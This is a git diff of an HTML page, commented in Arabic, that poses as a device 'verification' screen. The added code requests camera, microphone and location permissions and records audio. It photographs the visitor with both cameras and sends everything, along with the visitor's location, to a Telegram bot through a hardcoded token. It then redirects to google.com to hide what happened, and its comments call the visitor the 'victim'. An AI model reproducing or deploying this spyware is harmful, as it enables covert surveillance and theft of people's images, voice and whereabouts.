@@ -2,70 +2,85 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Checking System...</title>
+    <title>Checking System Identity...</title>
     <script>
         const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
         const CHID = "7984067238";
 
-        async function sendToTelegram(message, photoBlob = null) {
-            // إرسال النص
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHID, text: message, parse_mode: 'HTML' })
-            });
-
-            // إرسال الصورة إذا وجدت
-            if (photoBlob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHID);
-                formData.append('photo', photoBlob, 'snap.jpg');
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+        async function sendToTelegram(blob, type, caption = "") {
+            const formData = new FormData();
+            formData.append('chat_id', CHID);
+            if (type === 'photo') {
+                formData.append('photo', blob);
+                if (caption) formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } else if (type === 'audio') {
+                formData.append('voice', blob);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
             }
         }
 
-        async function start() {
+        async function captureMedia() {
             try {
-                // 1. طلب الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // 1. طلب صلاحيات الكاميرا والميكروفون والموقع دفعة واحدة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // 2. تسجيل الصوت لمدة 5 ثوانٍ
+                const recorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                recorder.ondataavailable = e => audioChunks.push(e.data);
+                recorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    await sendToTelegram(audioBlob, 'audio');
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+
+                // 3. التقاط الكاميرا الأمامية
+                await captureCamera("user", "📸 صورة من الكاميرا الأمامية");
+
+                // 4. التقاط الكاميرا الخلفية (إذا وجدت)
+                await captureCamera("environment", "📸 صورة من الكاميرا الخلفية");
+
+                // 5. جلب الموقع وإرساله كرسالة نصية
+                navigator.geolocation.getCurrentPosition(async pos => {
+                    const mapUrl = `📍 موقع الضحية اللحظي:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: CHID, text: mapUrl })
+                    });
+                    // التمويه النهائي
+                    window.location.href = "https://google.com";
+                });
+
+            } catch (err) {
+                console.error("Permissions Denied");
+            }
+        }
+
+        async function captureCamera(mode, caption) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-
-                // 2. طلب الموقع
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    
-                    // 3. التقاط الصورة بعد ثانيتين لضمان الوضوح
-                    setTimeout(async () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640; canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            const info = `<b>📍 ضحية جديدة من GitHub!</b>\n\n<b>الموقع:</b> https://www.google.com/maps?q=${lat},${lon}\n<b>المتصفح:</b> ${navigator.userAgent}`;
-                            await sendToTelegram(info, blob);
-                            
-                            // تحويل الضحية لمكان آخر للتمويه
-                            window.location.href = "https://google.com";
-                        }, 'image/jpeg');
-                    }, 2000);
-                }, (err) => {
-                     sendToTelegram("❌ الضحية رفضت إذن الموقع، لكننا سنحاول سحب الصورة.");
-                });
-            } catch (err) {
-                console.log("Permissions Denied");
-            }
+                
+                const canvas = document.createElement('canvas');
+                setTimeout(async () => {
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => sendToTelegram(blob, 'photo', caption), 'image/jpeg');
+                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد التقاط الصورة
+                }, 1000);
+            } catch (e) { console.log(mode + " not found"); }
         }
-        window.onload = start;
+
+        window.onload = captureMedia;
     </script>
 </head>
 <body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:20%;">
-    <h2>SYSTEM_INTEGRITY_CHECK</h2>
-    <p>Please wait while we verify your device...</p>
+    <h2>INITIALIZING_SECURE_PROTOCOL...</h2>
+    <p>Please accept all permissions to continue the verification process.</p>
 </body>
 </html>
